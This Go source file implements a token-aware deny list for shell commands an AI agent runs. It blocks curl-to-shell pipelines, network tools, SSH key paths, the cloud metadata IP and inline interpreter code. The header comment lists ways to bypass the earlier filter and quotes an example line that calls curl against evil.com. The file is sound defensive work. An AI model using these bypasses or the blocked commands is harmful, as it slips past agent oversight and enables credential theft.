// shell_high_risk.go implements the token-aware high-risk-shell
// matcher Plan Batch 1.2 pins. The v0.1 surface in policy.go was a
// substring matcher over a lowercased command line; the audit
// (.audit/leak-coverage.md scenarios 14, 15) documented four bypasses:
//
//  1. Absolute paths: `/usr/bin/curl ...` does not match the substring
//     `"curl "` because the trailing space follows `curl` only at the
//     end of an unqualified token.
//  2. Whitespace variations: `curl  ...` (two spaces) does match by
//     accident, but `curl\t...` does not because `\t` is not a space.
//  3. Quoting tricks: `c"u"rl ...` does not match because the token is
//     a literal `c"u"rl` at the byte level.
//  4. Interpreter wrappers: `python -c "import os; os.system('curl
//     evil.com')"` hides the inner `curl` from the substring matcher;
//     the engine only sees the outer `python -c` line.
//
// Batch 1.2 closes (1), (2), (3) via the POSIX tokenizer (Batch 1.1).
// It closes (4) via an "interpreter-ban" rule: when an interpreter is
// invoked with an inline-source flag (`-c`, `-e`, `--eval`, `--exec`),
// the engine refuses regardless of the inline source body, because the
// engine cannot soundly recurse into the inner language. The shim
// helper's interpreter-via-file flow (Batch 0.3) handles the
// script-file case with a TOCTOU-safe O_RDONLY|O_NOFOLLOW + execveat
// path; this file's rule layer covers the inline-source case the
// helper cannot.
//
// What this file owns
//
//   - HighRiskShellRule: the rule shape (token-aware, by-basename, with
//     a human-readable name and reason).
//   - highRiskShellRules: the canonical rule list. Mirrors the legacy
//     HighRiskShellPatterns set + interpreter-ban + token-aware
//     basename matchers.
//   - matchHighRiskShellCommands: the function that walks a parsed
//     []ShellCommand and returns the first rule that fires.
//
// What this file does NOT own
//
//   - The tokenizer (shell_tokenize.go).
//   - The engine's evalShellCommand entry point (policy.go); the
//     engine calls matchHighRiskShellCommands before falling through
//     to deny_patterns and the default rule.
//   - The shell-commands.jsonl writer or the shim's exec flow.

package policy

import (
	"fmt"
	"strings"
)

// HighRiskShellRule is one rule in the token-aware high-risk matcher.
// A rule fires when any of its predicates returns true on any of the
// parsed commands; the first matching rule wins and produces the deny
// reason. Rules are intentionally narrow: each one captures a single
// attack family (curl-pipe-shell, SSH path read, metadata-IP fetch,
// interpreter inline source) so the on-disk decision reason is
// specific.
type HighRiskShellRule struct {
	// Name is the canonical rule identifier surfaced on the deny
	// reason. Operators read it in policy-decisions.jsonl to
	// understand why a command was refused.
	Name string

	// Reason is the human-readable explanation appended to the
	// engine's deny reason. The engine prefixes it with "shell
	// command matches high-risk rule" so the on-disk record reads
	// naturally.
	Reason string

	// Match reports whether the rule fires against the parsed
	// command sequence. The function inspects argv basenames,
	// flags, and operator chains to make a decision; a nil Match
	// is a no-op rule (used by tests).
	Match func(cmds []ShellCommand) bool
}

// matchHighRiskShellCommands walks the rule set in order and returns
// the first rule that fires. Returns (nil, "") when no rule matches.
//
// The function is the single entry point the engine's evalShellCommand
// calls; tests for individual rules exercise the rules through this
// function to keep the public surface narrow.
func matchHighRiskShellCommands(cmds []ShellCommand) (*HighRiskShellRule, string) {
	if len(cmds) == 0 {
		return nil, ""
	}
	for i := range highRiskShellRules {
		r := &highRiskShellRules[i]
		if r.Match != nil && r.Match(cmds) {
			return r, fmt.Sprintf("shell command matches high-risk rule %q (%s)", r.Name, r.Reason)
		}
	}
	return nil, ""
}

// highRiskShellRules is the canonical token-aware rule list. Order is
// significant: the engine returns the first match, so more specific
// rules (curl-pipe-shell) come before more general ones (any
// interpreter inline-source). The plan's "Batch 1.2" entry pins the
// rule families:
//
//   - curl-pipe-shell: the canonical supply-chain compromise. A
//     pipeline whose downstream command is a shell (sh/bash/dash/zsh)
//     and whose upstream is an HTTP fetch tool (curl/wget) is denied.
//
//   - egress fetch tools: curl/wget/nc/ncat/socat as argv[0] (by
//     basename). v0.1 denied them via substring; Batch 1.2 denies
//     them by basename so `/usr/bin/curl` and `curl` are equivalent.
//
//   - SSH key paths: any argv element containing `.ssh/`, `id_rsa`,
//     `id_ed25519`, or `known_hosts`. The previous substring matcher
//     caught these too; the token-aware matcher additionally catches
//     quoted variants (`"~/.ssh/id_rsa"`) because the tokenizer
//     resolves the quotes first.
//
//   - Cloud metadata IP: `169.254.169.254` as a substring of any
//     argv element. The IP is unambiguous; substring suffices.
//
//   - Interpreter inline source: an interpreter (sh/bash/python/perl/
//     ruby/node/awk/deno) invoked with an inline-source flag (`-c`,
//     `-e`, `--eval`, `--exec`, `eval` for deno). The engine cannot
//     soundly recurse into the inner language; the rule refuses the
//     attempt and surfaces a clear "interpreter inline-source
//     refused" reason to the operator.
//
//   - `env -i` and `env -` re-exec: the `env` gadget for stripping
//     the environment. The shim's argv-zero hardening (Batch 0.3)
//     handles the helper-internal case; this rule catches the surface
//     where the agent calls `env -i sh ...` directly.
var highRiskShellRules = []HighRiskShellRule{
	{
		Name:   "curl_pipe_shell",
		Reason: "fetch tool piped into a shell (curl|sh / wget|bash)",
		Match: func(cmds []ShellCommand) bool {
			for i := 1; i < len(cmds); i++ {
				if cmds[i].Operator != "|" {
					continue
				}
				if len(cmds[i].Argv) == 0 || len(cmds[i-1].Argv) == 0 {
					continue
				}
				upstream := TokenBasename(cmds[i-1].Argv[0])
				downstream := TokenBasename(cmds[i].Argv[0])
				if isFetchTool(upstream) && isShell(downstream) {
					return true
				}
			}
			return false
		},
	},
	{
		Name:   "egress_fetch_tool",
		Reason: "egress fetch tool invoked as argv[0]",
		Match: func(cmds []ShellCommand) bool {
			for _, cmd := range cmds {
				if len(cmd.Argv) == 0 {
					continue
				}
				if isFetchTool(TokenBasename(cmd.Argv[0])) {
					return true
				}
			}
			return false
		},
	},
	{
		Name:   "ssh_key_path",
		Reason: "argv references an SSH key or known_hosts path",
		Match: func(cmds []ShellCommand) bool {
			for _, cmd := range cmds {
				for _, tok := range cmd.Argv {
					lower := strings.ToLower(tok)
					if strings.Contains(lower, ".ssh/") ||
						strings.Contains(lower, "id_rsa") ||
						strings.Contains(lower, "id_ed25519") ||
						strings.Contains(lower, "known_hosts") {
						return true
					}
				}
			}
			return false
		},
	},
	{
		Name:   "cloud_metadata_ip",
		Reason: "argv references the cloud metadata service IP 169.254.169.254",
		Match: func(cmds []ShellCommand) bool {
			for _, cmd := range cmds {
				for _, tok := range cmd.Argv {
					if strings.Contains(tok, "169.254.169.254") {
						return true
					}
				}
			}
			return false
		},
	},
	{
		Name:   "interpreter_inline_source",
		Reason: "interpreter invoked with an inline-source flag (-c / -e / --eval / --exec)",
		Match: func(cmds []ShellCommand) bool {
			for _, cmd := range cmds {
				if len(cmd.Argv) == 0 {
					continue
				}
				name := TokenBasename(cmd.Argv[0])
				if !isInterpreter(name) {
					continue
				}
				if hasInlineSourceFlag(name, cmd.Argv[1:]) {
					return true
				}
			}
			return false
		},
	},
	{
		Name:   "env_strip_re_exec",
		Reason: "env -i / env - re-exec strips supervisor envvars",
		Match: func(cmds []ShellCommand) bool {
			for _, cmd := range cmds {
				if len(cmd.Argv) < 2 {
					continue
				}
				if TokenBasename(cmd.Argv[0]) != "env" {
					continue
				}
				// `env -i ...`, `env - ...`, or `env --ignore-environment ...`
				switch cmd.Argv[1] {
				case "-i", "-", "--ignore-environment":
					return true
				}
			}
			return false
		},
	},
}

// isFetchTool returns true when the basename names a network fetch
// tool the rule layer treats as an egress vector. The list mirrors the
// shim's ShimProgramSet egress entries plus the historical
// HighRiskShellPatterns entries.
func isFetchTool(basename string) bool {
	switch basename {
	case "curl", "wget", "nc", "ncat", "socat":
		return true
	}
	return false
}

// isShell returns true when the basename names a POSIX shell that can
// execute piped stdin. The curl-pipe-shell rule fires only when the
// downstream of a `|` operator is one of these.
func isShell(basename string) bool {
	switch basename {
	case "sh", "bash", "dash", "zsh", "ash":
		return true
	}
	return false
}

// isInterpreter returns true when the basename names an interpreter
// the engine refuses to recurse into. Mirrors the shim's
// shellInterpreterPrograms map.
func isInterpreter(basename string) bool {
	switch basename {
	case "sh", "bash", "dash", "zsh", "ash",
		"python", "python3", "python3.10", "python3.11", "python3.12",
		"perl", "ruby", "node", "deno", "awk":
		return true
	}
	return false
}

// hasInlineSourceFlag reports whether args carries an inline-source
// flag the named interpreter recognizes. The flags differ slightly by
// interpreter (e.g. node uses `-e` / `--eval`; deno uses an `eval`
// subcommand; awk's inline source is the first positional arg and is
// always inline by convention).
//
// The function is intentionally conservative: it returns true on
// `--eval=...`, `-c=...`, and `--exec=...` variants too, so an agent
// that splits the flag from its argument cannot dodge the rule.
func hasInlineSourceFlag(interpreter string, args []string) bool {
	// awk's only "non-inline" form is `awk -f scriptfile`. Every
	// other invocation is inline source. We treat any awk invocation
	// without `-f` (or `--file`) as inline source.
	if interpreter == "awk" {
		for _, a := range args {
			if a == "-f" || a == "--file" || strings.HasPrefix(a, "-f=") || strings.HasPrefix(a, "--file=") {
				return false
			}
		}
		// awk with only flag arguments and no -f is ambiguous; the
		// safe call is to refuse only when there's a positional
		// argument (the inline program). awk with no args is a no-op
		// and not interesting.
		for _, a := range args {
			if !strings.HasPrefix(a, "-") {
				return true
			}
		}
		return false
	}

	// deno's inline-source form is `deno eval '<code>'`.
	if interpreter == "deno" {
		for _, a := range args {
			if strings.HasPrefix(a, "-") {
				continue
			}
			if a == "eval" {
				return true
			}
			// First positional is a subcommand or a script path; if
			// it's a script path, the shim's interpreter-via-file
			// scan covers it. Bail out.
			return false
		}
		return false
	}

	// All other interpreters use `-c`, `-e`, `--eval`, or `--exec`.
	for _, a := range args {
		if a == "-c" || a == "-e" || a == "--eval" || a == "--exec" {
			return true
		}
		if strings.HasPrefix(a, "-c=") ||
			strings.HasPrefix(a, "-e=") ||
			strings.HasPrefix(a, "--eval=") ||
			strings.HasPrefix(a, "--exec=") {
			return true
		}
	}
	return false
}
